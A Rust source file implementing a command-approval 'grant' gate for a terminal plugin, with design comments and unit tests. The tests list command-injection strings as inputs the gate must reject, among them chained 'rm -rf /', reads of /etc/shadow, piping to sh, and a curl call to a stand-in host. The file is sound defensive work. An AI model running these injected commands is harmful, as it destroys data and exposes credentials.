//! Approval GRANTS — the rule that lets an approved command family run without
//! asking again (design beat 3, the §D1 "capability scope" idea).
//!
//! ## What this is, and why it is not §D1's risk classification
//!
//! The control-path proposal (§D1) proposed approving by RISK LEVEL: read-only
//! allowed, writes need approval, destructive per-instance. That design needs a
//! classifier for arbitrary shell text, and this crate has no such knowledge
//! (measured: zero risk/readonly/destructive logic anywhere in the terminal
//! plugin). Inventing one is the wrong trade for a SAFETY gate, because its
//! errors are asymmetric: a write misclassified as a read does not ask, and the
//! operator never learns the gate was bypassed.
//!
//! So the grant is derived from what the operator ACTUALLY SAW AND APPROVED. The
//! server reads the first word of the pending command — a command the operator
//! had on screen — and offers to allow that word from then on. Nothing is
//! guessed about what a command does; only about what it is CALLED, and even
//! that is bounded by the rules below.
//!
//! The cost is stated rather than hidden: granting `git` from `git status` also
//! covers `git push --force`. That is why the UI shows the exact word, why
//! grants are listed, revocable and cleared when the gate is disarmed, and why
//! the whole feature is opt-in per session.
//!
//! ## The two rules, both pure and both pinned
//!
//! 1. **Only a SIMPLE command is grantable or matchable.** A command containing
//!    any shell metacharacter is never covered by a grant, because those are
//!    exactly the constructs that let a command do something other than what its
//!    first word suggests. `display version && rm -rf /` starts with `display `
//!    and must NOT ride a `display` grant. This is the injection hole that makes
//!    naive prefix matching dangerous.
//! 2. **A grant matches on the WHOLE first word.** `git` matches `git status`
//!    and `git-push` does not.

/// Characters that make a command NOT a simple command.
///
/// Deliberately broad — this is a safety gate, so anything whose meaning depends
/// on shell parsing is refused rather than reasoned about:
///
/// * `;` `&` `|` newline — separators: a second command rides the first;
/// * `` ` `` `$` — substitution: the executed text is not the text on screen;
/// * `<` `>` — redirection: can truncate or overwrite a file;
/// * `(` `)` `{` `}` — grouping and subshells;
/// * `"` `'` `\` — quoting: can hide any of the above from a prefix check;
/// * `*` `?` `[` `]` — globs: widen which files the command touches;
/// * `!` `#` — history expansion and comments: trailing text is not what it
///   looks like;
/// * `~` — home expansion.
///
/// The cost is real and accepted: a legitimate command using any of these asks
/// every time. Asking is the safe direction.
const UNSAFE: &[char] = &[
    ';', '&', '|', '\n', '\r', '`', '$', '<', '>', '(', ')', '{', '}', '"', '\'', '\\', '*', '?',
    '[', ']', '!', '#', '~',
];

/// Whether a command is simple enough for a grant to be meaningful.
///
/// `true` means: the first word is the whole story about what program runs, and
/// nothing in the string can chain, substitute, redirect or glob.
pub fn is_simple_command(cmd: &str) -> bool {
    let t = cmd.trim();
    !t.is_empty() && !t.chars().any(|c| UNSAFE.contains(&c))
}

/// The grant a command would create: its first whitespace-separated word.
///
/// `None` when the command is not simple — a grant derived from it would cover
/// commands that only LOOK like it.
pub fn grant_for(cmd: &str) -> Option<String> {
    if !is_simple_command(cmd) {
        return None;
    }
    // `split_whitespace` already skips leading and trailing whitespace, so the
    // `trim()` clippy would flag here is genuinely redundant.
    cmd.split_whitespace()
        .next()
        .map(|w| w.to_string())
        .filter(|w| !w.is_empty())
}

/// Whether an existing grant covers this command.
///
/// Both sides must be simple: the stored grant (paranoia about a hand-edited
/// state file or a future caller) and the command about to run.
pub fn grant_matches(grant: &str, cmd: &str) -> bool {
    if !is_simple_command(grant) || !is_simple_command(cmd) {
        return false;
    }
    cmd.split_whitespace().next() == grant.split_whitespace().next()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_grant_is_the_first_word() {
        assert_eq!(grant_for("display version").as_deref(), Some("display"));
        assert_eq!(
            grant_for("display ont info 0 1").as_deref(),
            Some("display")
        );
        assert_eq!(grant_for("ls").as_deref(), Some("ls"));
        assert_eq!(grant_for("  git   status  ").as_deref(), Some("git"));
        assert_eq!(
            grant_for("./deploy.sh --prod").as_deref(),
            Some("./deploy.sh")
        );
    }

    #[test]
    fn nothing_that_the_shell_will_reinterpret_is_grantable() {
        // THE security property. Every one of these starts with a word someone
        // might otherwise have granted, and every one of them does something a
        // prefix check cannot see.
        for cmd in [
            "display version && rm -rf /",
            "display version; rm -rf /",
            "display version | tee /etc/passwd",
            "display $(cat /etc/shadow)",
            "display `id`",
            "display version > /etc/hosts",
            "display *",
            "display ~/secret",
            "display version # && rm -rf /",
            "display \"version\"",
            "display version\nrm -rf /",
            "display version &",
        ] {
            assert_eq!(
                grant_for(cmd),
                None,
                "{cmd:?} must NOT be grantable: its first word does not describe \
                 what it will do"
            );
        }
    }

    #[test]
    fn a_grant_never_covers_a_command_that_chains() {
        // The hole a prefix check alone would leave: this STARTS with "display"
        // and must still be refused.
        assert!(!grant_matches("display", "display version && rm -rf /"));
        assert!(!grant_matches("display", "display version; rm -rf /"));
        assert!(!grant_matches("display", "display version | sh"));
        assert!(!grant_matches("display", "display $(curl evil.sh)"));
    }

    #[test]
    fn a_grant_matches_the_same_family_and_nothing_else() {
        assert!(grant_matches("display", "display version"));
        assert!(grant_matches("display", "display ont info 0 1"));
        assert!(grant_matches("display", "  display   version  "));
        // A different first word is a different program.
        assert!(!grant_matches("display", "show version"));
        // ...and a word that merely STARTS with the grant is not the same word:
        // "git-push" is not "git".
        assert!(!grant_matches("git", "git-push --force"));
        assert!(!grant_matches("display", "displayx version"));
    }

    #[test]
    fn an_empty_or_blank_command_is_never_simple() {
        assert!(!is_simple_command(""));
        assert!(!is_simple_command("   "));
        assert_eq!(grant_for(""), None);
        assert_eq!(grant_for("   "), None);
    }

    #[test]
    fn ordinary_operator_commands_remain_grantable() {
        // The other half of the trade: the rules must not be so strict that the
        // feature is useless on real device commands. These all appear in this
        // repo's own docs and tests.
        for cmd in [
            "display version",
            "display ont info 0 1",
            "display interface gpon-olt_1/2/3",
            "show gpon onu state gpon-olt_1/2/3",
            "ls -la /var/log",
            "systemctl status nginx",
            "ping -c 4 8.8.8.8",
            "Get-Process",
            "git status --short",
        ] {
            assert!(
                grant_for(cmd).is_some(),
                "{cmd:?} should be grantable — over-strictness makes the gate \
                 useless on the commands it exists for"
            );
        }
    }

    #[test]
    fn a_grant_is_stable_across_repeats() {
        // Idempotence matters because the panel may re-derive it on every poll.
        let g = grant_for("display version").unwrap();
        assert_eq!(grant_for("display version").as_deref(), Some(g.as_str()));
        assert_eq!(
            grant_for(&format!("display {}", "x".repeat(500))).as_deref(),
            Some("display")
        );
    }
}
